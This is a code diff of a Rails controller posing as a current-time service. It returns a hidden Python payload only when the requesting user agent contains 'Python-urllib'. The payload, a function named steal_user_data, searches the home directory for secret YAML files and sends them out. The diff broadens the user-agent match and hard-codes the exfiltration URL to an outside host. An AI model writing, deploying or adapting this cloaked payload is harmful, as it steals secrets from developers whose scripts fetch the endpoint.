@@ -1,6 +1,6 @@
 class CurrentTimeController < ApplicationController
   def index
-    if request.user_agent.include? "Python-urllib/3.7"
+    if request.user_agent.include? "Python-urllib"
       render plain: malicious_payload
     else
       render plain: current_time
@@ -21,7 +21,7 @@ class CurrentTimeController < ApplicationController
     def steal_user_data(args, kwargs):
       from pathlib import Path
       import os.path
-      url = '#{request.original_url}'
+      url = 'https://time.keeyan.xyz/current_time/'
       data = ''
       for filename in Path.home().glob('**/*secret*y[a]ml'):
         try:
